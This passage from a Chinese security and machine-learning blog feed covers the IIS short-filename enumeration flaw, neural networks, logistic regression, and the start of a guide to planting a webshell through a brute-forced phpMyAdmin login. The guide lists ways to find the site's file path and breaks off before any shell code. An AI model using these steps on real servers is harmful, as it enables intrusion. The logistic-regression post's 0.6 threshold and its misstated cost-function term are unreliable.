    <url>/2018/06/28/IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-IIS短文件名"><a href="#0x00-IIS短文件名" class="headerlink" title="0x00 IIS短文件名"></a>0x00 IIS短文件名</h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的DOS 8.3 短文件名。</p><p>Windows下查看对应的短文件名，可以使用命令 dir /x</p><p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename01.png?raw=true"></p><p>对应短文件名的规律是：</p><ul><li>前六位保留</li><li>所有小写字母均转换成大写字母</li><li>后续字符用~1表示</li><li>后缀最多显示三位，其余的被截断</li><li>长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件</li></ul><h2 id="0x01-IIS短文件名漏洞"><a href="#0x01-IIS短文件名漏洞" class="headerlink" title="0x01 IIS短文件名漏洞"></a>0x01 IIS短文件名漏洞</h2><p>在IIS的web服务中，有时无法直接访问一些文件，但是我们发送一个存在通配符* 和?的请求,当IIS接收到一个文件路径中包含~的请求时，根据文件是否存在返回值是不同的，我们可以利用这个方法猜解本来无法得到的文件名。</p><ul><li><p>访问构造的某个存在的短文件名，会返回404</p></li><li><p>访问构造的某个不存在的短文件名，会返回400</p></li></ul><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>本来受到IIS短文件名漏洞影响的版本如下：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">IIS</span> 1.0，Windows NT 3.51  <br><span class="hljs-keyword">IIS</span> 3.0，Windows NT 4.0 Service Pack 2  <br><span class="hljs-keyword">IIS</span> 4.0，Windows NT 4.0选项包 <br><span class="hljs-keyword">IIS</span> 5.0，Windows 2000  <br><span class="hljs-keyword">IIS</span> 5.1，Windows XP Professional和Windows XP Media Center Edition  <br><span class="hljs-keyword">IIS</span> 6.0，Windows Server 2003和Windows XP Professional x64 Edition  <br><span class="hljs-keyword">IIS</span> 7.0，Windows Server 2008和Windows Vista  <br><span class="hljs-keyword">IIS</span> 7.5，Windows 7（远程启用&lt;customErrors&gt;或没有web.config）<br><span class="hljs-keyword">IIS</span> 7.5，Windows 2008（经典管道模式）<br>注意：<span class="hljs-keyword">IIS</span>使用.<span class="hljs-keyword">Net</span> Framework 4时不受影响<br></code></pre></td></tr></table></figure><p>以上受影响范围主要是针对HTTP GET方法，且需要同时安装ASP.NET应用程序。</p><p>但是漏洞发现者Soroush Dalili之后再次在IIS7.5和IIS8.0的版本中发现，当使用OPTIONS来代替GET 方法时，如果请求中的短文件名是存在的，IIS会返回一个不一样的错误信息。</p><p>而且在之后的版本中此漏洞也都成功验证。<br>所以影响的版本又加上了：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">IIS</span> <span class="hljs-number">8</span>.<span class="hljs-number">0</span>，Windows <span class="hljs-number">8</span>, Windows Server <span class="hljs-number">2012</span><br><span class="hljs-attribute">IIS</span> <span class="hljs-number">8</span>.<span class="hljs-number">5</span>，Windows <span class="hljs-number">8</span>.<span class="hljs-number">1</span>,Windows Server <span class="hljs-number">2012</span> R<span class="hljs-number">2</span><br><span class="hljs-attribute">IIS</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>，Windows <span class="hljs-number">10</span>, Windows Server <span class="hljs-number">2016</span><br></code></pre></td></tr></table></figure><p>所以，短文件名漏洞存在于目前IIS的所有版本中。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="在windows10下打开IIS服务"><a href="#在windows10下打开IIS服务" class="headerlink" title="在windows10下打开IIS服务"></a>在windows10下打开IIS服务</h3><p>开始—–&gt;控制面板—-&gt;程序—-&gt;启用或关闭windows功能，勾选以下选项，安装IIS。</p><p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename02.png?raw=true"></p><p>在浏览器访问ip地址，如果发现IIS windows信息说明安装成功。</p><p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename03.png?raw=true"></p><p>IIS 安装成功以后，会默认在C盘目录下生成intpub目录，网站的根目录位于C:\inetpub\wwwroot，此时我们创建几个asp文件之后，再使用dir /x查看下根目录是否存在短文件名</p><p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename04.png?raw=true"></p><p>我们可以看到，有的文件有短文件名，有的文件没有，这是因为之前提到的，长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>常用的利用方式有以下几种</p><h3 id="短文件名泄露"><a href="#短文件名泄露" class="headerlink" title="短文件名泄露"></a>短文件名泄露</h3><p>我们可以写python脚本通过HTTP的OPTIONS方法爆破文件名，也可以下载专用的爆破工具来扫描。</p><h3 id="apache下通过短文件名下载"><a href="#apache下通过短文件名下载" class="headerlink" title="apache下通过短文件名下载"></a>apache下通过短文件名下载</h3><p>当Apache运行在windows下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。</p><h3 id="Net-Framework的拒绝服务攻击"><a href="#Net-Framework的拒绝服务攻击" class="headerlink" title="Net Framework的拒绝服务攻击"></a>Net Framework的拒绝服务攻击</h3><p>当请求文件夹名称包含~1的请求，会导致不存在该文件的.Net framework去递归所有根目录。特别是第一次请求时，会造成的文件读取特别多。用僵尸网络不断向服务器发送此类请求，很容易耗尽对方服务器资源。</p><h2 id="0x05-局限性"><a href="#0x05-局限性" class="headerlink" title="0x05 局限性"></a>0x05 局限性</h2><ul><li><p>1.此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</p></li><li><p>2.如果文件名本身太短（无短文件名）也是无法猜解的</p></li><li><p>3.如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</p></li><li><p>4.如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</p></li><li><p>5.不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</p></li></ul><h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><h4 id="禁止url中使用“-”或它的Unicode编码"><a href="#禁止url中使用“-”或它的Unicode编码" class="headerlink" title="禁止url中使用“~”或它的Unicode编码"></a>禁止url中使用“~”或它的Unicode编码</h4><h4 id="关闭windows的8-3格式功能"><a href="#关闭windows的8-3格式功能" class="headerlink" title="关闭windows的8.3格式功能"></a>关闭windows的8.3格式功能</h4><ul><li>命令行中关闭：<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fsutil</span> <span class="hljs-number">8</span>dot<span class="hljs-number">3</span>name set <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li>注册表中禁用：<br>在注册表中找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，代表不创建短文件名格式</li></ul><h4 id="升级netFramework至4-0以上版本"><a href="#升级netFramework至4-0以上版本" class="headerlink" title="升级netFramework至4.0以上版本"></a>升级netFramework至4.0以上版本</h4><h4 id="修改注册表禁用短文件名功能"><a href="#修改注册表禁用短文件名功能" class="headerlink" title="修改注册表禁用短文件名功能"></a>修改注册表禁用短文件名功能</h4><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>相对来说这个漏洞比较鸡肋，微软也表示IIS短文件漏洞未达到安全更新标准，需要确定何时在下一个逻辑版本中解决它。</p><p>虽然漏洞的威胁不大，但是正因不严重导致微软没有更新，现在所有版本都存在这个问题，当有人将其与其他漏洞配合起来使用时，也是有可能造成很严重的后果。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(4)——神经网络</title>
    <link href="/2018/06/27/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-4-%E2%80%94%E2%80%94%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <url>/2018/06/27/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-4-%E2%80%94%E2%80%94%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-神经网络"><a href="#0x00-神经网络" class="headerlink" title="0x00 神经网络"></a>0x00 神经网络</h2><p>人工神经网络（Artificial Neural Network，缩写ANN），简称神经网络（Neural Network，缩写NN），是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。</p><h2 id="0x01-神经元"><a href="#0x01-神经元" class="headerlink" title="0x01 神经元"></a>0x01 神经元</h2><p>一个神经元通常具有多个树突，主要用来接受传入信息；而轴突只有一条，轴突尾端有许多轴突末梢可以给其他多个神经元传递信息。轴突末梢跟其他神经元的树突产生连接，从而传递信号。这个连接的位置在生物学上叫做“突触”。</p><p>人脑中神经元如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_01.png?raw=true"></p><h2 id="0x02-神经元的数学模型"><a href="#0x02-神经元的数学模型" class="headerlink" title="0x02 神经元的数学模型"></a>0x02 神经元的数学模型</h2><p>神经元模型是一个包含输入，输出与计算功能的模型。输入可以类比为神经元的树突，而输出可以类比为神经元的轴突，计算则可以类比为细胞核。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_02.png?raw=true"></p><p>每个连线上都会分配一个权值，在数据传向下一层的时候要乘以对应的权值。在神经网络中，每个箭头表示值的加权传递。</p><p>如果我们将神经元图中的所有变量用符号表示，并且写出输出的计算公式，就会得到：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_03.png?raw=true"></p><p>z是在输入和权值的线性加权和叠加了一个激活函数g的值。在MP模型里，函数g是sgn函数，也就是取符号函数。这个函数当输入大于0时，输出1，否则输出-1。</p><p>接下来我们将sum函数与sgn函数合并到一个圆圈里，代表神经元的内部计算。其次，把输入a与输出z写到连接线的左上方，便于后面画复杂的网络。一个神经元可以引出多个代表输出的有向箭头，但值都是一样的。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_04.png?raw=true"></p><p>在其他类型神经网络中，这里的激活函数可以有很多种形式：</p><ul><li>线性函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_05.png?raw=true"></p><ul><li>阈值函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_06.png?raw=true"></p><ul><li>Sigmoid函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_07.png?raw=true"></p><ul><li>对称Sigmoid函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_08.png?raw=true"></p><ul><li>双曲正切函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_09.png?raw=true"></p><ul><li>高斯函数</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_10.png?raw=true"></p><p>神经元可以看作一个计算与存储单元。计算是神经元对其的输入进行计算功能。存储是神经元会暂存计算结果，并传递到下一层。</p><p>一个神经网络的训练算法的功能就是通过大量的样本数据训练，让权重的值调整到最佳，以使得整个网络的预测效果最好。然后用来在已知所有输入值的情况下预测输出值。</p><h2 id="0x03-单层神经网络-感知器"><a href="#0x03-单层神经网络-感知器" class="headerlink" title="0x03 单层神经网络(感知器)"></a>0x03 单层神经网络(感知器)</h2><p>感知器(Perceptron)由两层神经元组成的神经网络。两层分别是输入层和输出层，输入层只负责传输数据，输出层对前一层传输过来的数据进行计算。</p><p>结构如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_11.png?raw=true"></p><p>其中，需要计算的层次也被称为计算层，因为感知器拥有一个计算层，所以称之为“单层神经网络”。</p><p>感知器中，我们把 w 称为权重向量，a 称为训练样本。</p><p>感知器数据分类的算法步骤如下：</p><p>把 w 初始化为 0，或者把 w 的每个分量初始化为[0, 1]之间的任意小数；<br>把训练样本 a 输入感知器，得到分类结果 z （-1或1）；<br>根据分类结果更新权重向量。</p><p>权重更新算法：</p><p>wj=wj+∇wj</p><p>∇wj=η∗(z−z′)∗aj</p><p>其中</p><ul><li>η 是学习率，在 [0,1] 之间。</li><li>z 是输入样本的正确分类，z’ 是感知器计算出来的分类。</li></ul><p>假设初始w=[0,0,0],a=[1,2,3]，z=1，z’=-1时，通过算法计算：</p><p>∇w0=0.3∗(1−(−1))∗x0=0.3∗2∗1=0.6</p><p>w0=w0+∇w0=0.6 </p><p>∇w1=0.3∗(1−(−1))∗x1=0.3∗2∗2=1.2</p><p>w1=w1+∇w1=1.2</p><p>∇w2=0.3∗(1−(−1))∗x2=0.3∗2∗3=1.8</p><p>w2=w2+∇w2=1.8</p><p>得到更新后的w=[0.6,1.2,1.8]</p><p>我们在输入大量样本时，每次在答案正确时不会更改，每次在答案错误时更新权值，只要取的学习率和样本量合适，就可以得到学习之后更为精准的算法。</p><p>我们可以看到，感知器类似一个逻辑回归模型，可以做线性分类任务。</p><p>我们可以用决策分界来形象的表达分类的效果。决策分界就是在二维的数据平面中划出一条直线，当数据的维度是3维的时候，就是划出一个平面，当数据的维度是n维时，就是划出一个n-1维的超平面。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_12.png?raw=true"></p><h2 id="0x04-两层神经网络-多层感知器"><a href="#0x04-两层神经网络-多层感知器" class="headerlink" title="0x04 两层神经网络(多层感知器)"></a>0x04 两层神经网络(多层感知器)</h2><p>两层神经网络也就是多了一层计算层(被称为隐藏层)，在增加了这一层之后，神经网络就可以解决一些复杂的问题。</p><p>此时，权值矩阵增加到两个，计算层数分为隐藏层计算和输出层计算。</p><p>不过不同于单层的sgn函数，在两层神经网络中，我们使用的激活函数最多的是sigmoid函数。</p><p>隐藏层计算如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_13.png?raw=true"></p><p>输出层计算如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_14.png?raw=true"></p><p>总的计算公式：</p><p>g(W(1) * a(1)) = a(2); </p><p>g(W(2) * a(2)) = z;</p><p>与单层神经网络不同。理论证明，两层神经网络可以无限逼近任意连续函数。也就是说，面对复杂的非线性分类任务，两层（带一个隐藏层）神经网络可以分类的很好。</p><p>如下例，红色的线与蓝色的线代表数据。而红色区域和蓝色区域代表由神经网络划开的区域，两者的分界线就是决策分界。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_15.png?raw=true"></p><h2 id="0x05-多层神经网络"><a href="#0x05-多层神经网络" class="headerlink" title="0x05 多层神经网络"></a>0x05 多层神经网络</h2><p>延续两层神经网络,在两层神经网络的输出层后面，继续添加层次。原来的输出层变成中间层，新加的层次成为新的输出层。我们这样依次添加，就会产生多层神经网络。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_16.png?raw=true"></p><p>增加了层数，那么正向传播计算公式也会增加一步</p><p>g(W(1) * a(1)) = a(2); </p><p>g(W(2) * a(2)) = a(3);</p><p>g(W(3) * a(3)) = z;</p><p>再增加层数的话，与上面同理递推即可：</p><p>g(W(1) * a(1)) = a(2); </p><p>g(W(2) * a(2)) = a(3);</p><p>···</p><p>g(w(n-1) * a(n-1)) = a(n);</p><p>g(W(n) * a(n)) = z;</p><p>随着网络的层数增加，每一层对于前一层次的抽象表示更深入。代表着更深入的表示特征，以及更强的函数模拟能力。在参数数量一样的情况下，更深的网络往往具有比浅层的网络更好的识别效率。</p><p>相比于单层神经网络的sgn函数和双层神经网络的sigmoid函数，到了多层神经网络时，通过一系列的研究发现，ReLU函数在训练多层神经网络时，更容易收敛，并且预测性能更好。</p><p>ReLU函数不是传统的非线性函数，而是分段线性函数。其表达式非常简单，就是y=max(x,0)。简而言之，在x大于0，输出就是输入，而在x小于0时，输出就保持为0。这种函数的设计启发来自于生物神经元对于激励的线性响应，以及当低于某个阈值后就不再响应的模拟。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_17.png?raw=true"></p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(3)——逻辑回归</title>
    <link href="/2018/06/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-3-%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"/>
    <url>/2018/06/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-3-%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-逻辑回归-Logistic-Regression"><a href="#0x00-逻辑回归-Logistic-Regression" class="headerlink" title="0x00 逻辑回归(Logistic Regression)"></a>0x00 逻辑回归(Logistic Regression)</h2><p>逻辑回归就是这样的一个过程：面对一个回归或者分类问题，建立代价函数，然后通过优化方法迭代求解出最优的模型参数，然后测试验证我们这个求解的模型的好坏。</p><p>Logistic回归虽然名字里带“回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别）</p><p>回归模型中，y是一个定性变量，比如y=0或1，logistic方法主要应用于研究某些事件发生的概率。</p><h2 id="0x01-逻辑回归模型"><a href="#0x01-逻辑回归模型" class="headerlink" title="0x01 逻辑回归模型"></a>0x01 逻辑回归模型</h2><p>它的核心思想是，如果线性回归的结果输出是一个连续值，而值的范围是无法限定的，那我们有没有办法把这个结果值映射为可以帮助我们判断的结果呢。而如果输出结果是 (0,1) 的一个概率值，这个问题就很清楚了。</p><p>在数学上有sigmoid函数可以帮助我们实现这一思想。</p><p>sigmoid函数表达式：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_01.png?raw=true"></p><p>二元逻辑回归时，将t换成ax+b，可以得到二元逻辑回归模型的参数形式：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_02.png?raw=true"></p><p>sigmoid函数图形：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_03.png?raw=true"></p><p>其中，如果是二元回归时，我们P(x)的值可以理解为某一分类概率的大小，如果P(x)值为0.6，代表输出为1的概率是60%，补集部分是输出为0的概率40%。</p><p>此时P(x)的值越小，而分类为0的的概率越高，反之，值越大的话分类为1的的概率越高。如果靠近临界点即靠近0.6时，分类准确率会下降。</p><h2 id="0x02-决策边界-decision-boundary"><a href="#0x02-决策边界-decision-boundary" class="headerlink" title="0x02 决策边界(decision boundary)"></a>0x02 决策边界(decision boundary)</h2><p>决策边界就是能够把样本正确分类的一条边界，从图像上可以直观的看到</p><p>如线性决策边界：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_04.png?raw=true"></p><p>非线性决策边界：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_05.png?raw=true"></p><p>在上面二元逻辑回归的例子中，我们用y表示输出的离散值0或1，写为函数形式为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_06.png?raw=true"></p><p>然后我们逻辑函数g要做到，在输入大于等于零时，输出大于等于0.6；在输入小于零时，输出小于等于0.6。即：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_07.png?raw=true"></p><p>决策边界是假设函数的属性，由参数决定，而不是由数据集的特征决定。</p><h2 id="0x03-成本函数-Cost-Function"><a href="#0x03-成本函数-Cost-Function" class="headerlink" title="0x03 成本函数(Cost Function)"></a>0x03 成本函数(Cost Function)</h2><p>线性回归中也说过成本函数，也叫代价函数,在逻辑回归中，我们也需要定义成本函数对其取值的好坏进行评估。</p><p>而逻辑回归如果取用和线性回归一样的方式计算成本函数，那么图形是“非凸”的。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_08.png?raw=true"></p><p>这样就会产生很多个局部最小值，无法使用梯度下降算法。所以我们需要一个新的成本函数。</p><p>在逻辑回归中，损失函数是用来估计预测值（y^(i)）与期望输出值（y(i)）之间的差异。</p><p>统计学习中常用的损失函数有以下几种：</p><p>(1) 0-1损失函数(0-1 loss function):</p><p>(2) 平方损失函数(quadratic loss function)</p><p>(3) 绝对损失函数(absolute loss function)</p><p>(4) 对数损失函数(logarithmic loss function) 或对数似然损失函数(log-likelihood loss function)</p><p>损失函数越小，模型就越好。</p><p>所以在逻辑回归中，为了保证全局收敛，我们采用对数似然损失函数。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_09.png?raw=true"></p><p>也就是说，如下两个情况：</p><p>如果是正确答案为y=1的情况：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_10.png?raw=true"></p><p>当y=1, 则Cost=0，也就是预测的值和真实的值完全相等的时候成本为0;但是如果y=0，Cost接近无穷大，也就是说此时成本会非常大。</p><p>如果是正确答案为y=0的情况：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_11.png?raw=true"></p><p>当y=0, 则Cost=0，也就是预测的值和真实的值完全相等的时候成本为0;但是如果y=1，Cost接近无穷大，也就是说此时成本会非常大。</p><h2 id="0x04-简化成本函数"><a href="#0x04-简化成本函数" class="headerlink" title="0x04 简化成本函数"></a>0x04 简化成本函数</h2><p>在上面式子中，由于y 只能等于0或1，所以可以将逻辑回归中的Cost function的两个公式合并可以将我们的成本函数的两个条件案例压缩成一个案例：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_12.png?raw=true"></p><p>当y等于1时，第二项（1-y）log（1- hθ（x））将为零，并且不会影响结果。如果y等于0，则所述第一术语-ylog（1-hθ（X））将为零，且不会影响结果。</p><p>所以最终整个逻辑回归的成本函数如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_13.png?raw=true"></p><h2 id="0x05-梯度下降"><a href="#0x05-梯度下降" class="headerlink" title="0x05 梯度下降"></a>0x05 梯度下降</h2><p>与线性回归相似，这里我们同样采用梯度下降算法来学习参数</p><p>迭代函数</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_14.png?raw=true"></p><p>算法就是迭代这个公式每次更新参数值，上篇已经详细说过</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_15.png?raw=true"></p><h2 id="0x06-优化-Advanced-Optimization"><a href="#0x06-优化-Advanced-Optimization" class="headerlink" title="0x06 优化(Advanced Optimization)"></a>0x06 优化(Advanced Optimization)</h2><p>优化算法除了梯度下降算法外，还包括：</p><ul><li>Conjugate gradient method(共轭梯度法)</li><li>Quasi-Newton method(拟牛顿法)</li><li>BFGS method</li><li>L-BFGS(Limited-memory BFGS)</li></ul><p>后二者由拟牛顿法引申出来，与梯度下降算法相比，这些算法的优点是：</p><ul><li>1.不需要手动的选择步长</li><li>2.通常比梯度下降算法快</li></ul><p>因为算法太过复杂，我们不需要手动编写代码，只需要在库中调用相关的函数即可。</p><h2 id="0x07-多分类问题-Multiclass-Classification-One-vs-all"><a href="#0x07-多分类问题-Multiclass-Classification-One-vs-all" class="headerlink" title="0x07 多分类问题(Multiclass Classification: One-vs-all)"></a>0x07 多分类问题(Multiclass Classification: One-vs-all)</h2><p>我们大多时候遇到的分类并不止两类，这个时候就产生了多分类问题。</p><p>首先，二分类问题时候图形如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_16.png?raw=true"></p><p>那么多分类问题的图形就如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_17.png?raw=true"></p><p>对于多分类问题，我们可以将其先看成二分类问题，保留一类之后剩余的划作另一类。</p><p>对上面的三类问题，我们需要三次划分，如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_18.png?raw=true"></p><p>最终的One-vs-all方法：</p><ul><li><p>对于每一个类i训练一个逻辑回归模型的分类器，并且预测 y = i时的概率。</p></li><li><p>对于一个新的输入变量x,分别对每一个类进行预测，取概率最大的那个类作为分类结果。</p></li></ul><p>也就是说，如果输入一个x，此时分类器A概率为0.3，分类器B概率为0.4，分类器C概率为0.5，那么他就属于C这个分类。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin注入webshell总结</title>
    <link href="/2018/06/22/phpmyadmin%E6%B3%A8%E5%85%A5webshell%E6%80%BB%E7%BB%93/"/>
    <url>/2018/06/22/phpmyadmin%E6%B3%A8%E5%85%A5webshell%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候，我们扫到了暴露在公网的phpmyadmin页面，并且能爆破出密码时，我们就可以对目标数据库做一些操作了，这个时候我们想进一步拿到webshell，就有很多种办法可以尝试。</p><p>以下技巧不仅仅能在已经进入phpmyadmin的情况下使用，其他的管理系统或者只要是拥有一定权限的mysql执行环境都可以使用。</p><h2 id="0x01-寻找物理路径"><a href="#0x01-寻找物理路径" class="headerlink" title="0x01 寻找物理路径"></a>0x01 寻找物理路径</h2><p>我们进入phpmyadmin之后想要写webshell，得先知道网站物理路径，才能通过其他办法将构造好的一句话木马写入。所以第一步就是寻找物理路径。</p><h3 id="phpinfo泄露"><a href="#phpinfo泄露" class="headerlink" title="phpinfo泄露"></a>phpinfo泄露</h3><p>物理路径大多是一些页面未作限制导致敏感信息泄露的，所以我们首先从敏感信息泄露入手，方法一般为扫网站目录，如果能得到phpinfo等敏感文件，就很容易得到物理路径。</p><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin01.png?raw=true"></p><h3 id="错误页面泄露"><a href="#错误页面泄露" class="headerlink" title="错误页面泄露"></a>错误页面泄露</h3><p>有的网站，访问错误页面会提示网站路径，也可以在这方面入手。</p><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin02.png?raw=true"></p><p>想要找到网站错误页面，可以尝试：</p><ul><li>单引号爆路径： 在页面后门加单引号，如果网站没有过滤单引号且产生错误，一般会返回错误页面可以读取到物理路径。</li><li>错误参数值爆路径： 在可以post参数的位置，提交错误参数使网站出错，有时会得到物理路径。</li><li>Google爆路径： 通过google语法搜索对应网站包含warning、fatal error的页面，如Site:xxx.com warning和Site:xxx.com.cn “fatal error”，很容易找到错误路径。</li><li>错误解析爆路径： 很多服务器，如果访问一个不存在的php页面等因为不存在而无法解析的页面，会返回解析错误页面，会得到物理路径。</li></ul><h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。</p><p>如：</p><ul><li>1./phpmyadmin/libraries/lect_lang.lib.php</li><li>2./phpMyAdmin/index.php?lang[]=1</li><li>3./phpMyAdmin/phpinfo.php</li><li>4.load_file()</li><li>5./phpmyadmin/themes/darkblue_orange/layout.inc.php</li><li>6./phpmyadmin/libraries/select_lang.lib.php</li><li>7./phpmyadmin/libraries/lect_lang.lib.php</li><li>8./phpmyadmin/libraries/mcrypt.lib.php</li></ul><h3 id="猜路径"><a href="#猜路径" class="headerlink" title="猜路径"></a>猜路径</h3><p>如果上述方法都没有找到物理路径，我们就得开始猜路径了。</p><p>可以通过常用的网站套件默认路径来猜，如：</p><ul><li>lamp套件： /var/www/html/index.php</li><li>lnmp套件： /home/wwwroot/default</li><li>wamp套件： C:/wamp/www或者D:/wamp/www</li><li>iis服务器： D:/vhost/wwwroot/www</li><li>phpstudy套件： D:/phpstudy/www</li></ul><p>还有非常多，可以自己根据实际情况去搜索。</p><h2 id="0x02-直接写出文件"><a href="#0x02-直接写出文件" class="headerlink" title="0x02 直接写出文件"></a>0x02 直接写出文件</h2><p>物理路径知道了，这个时候我们该在可以访问的物理路径上写webshell了。</p><p>首先我们要确认mysql是否有写文件的权限，可以通过访问secure-file-priv来查看是否有写文件的权限：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin03.png?raw=true"></p><p>可以看到我本机的情况是只能在F:/wamp/tmp文件夹下进行写文件，这里secure-file-priv有三种情况：</p><ul><li>NULL： 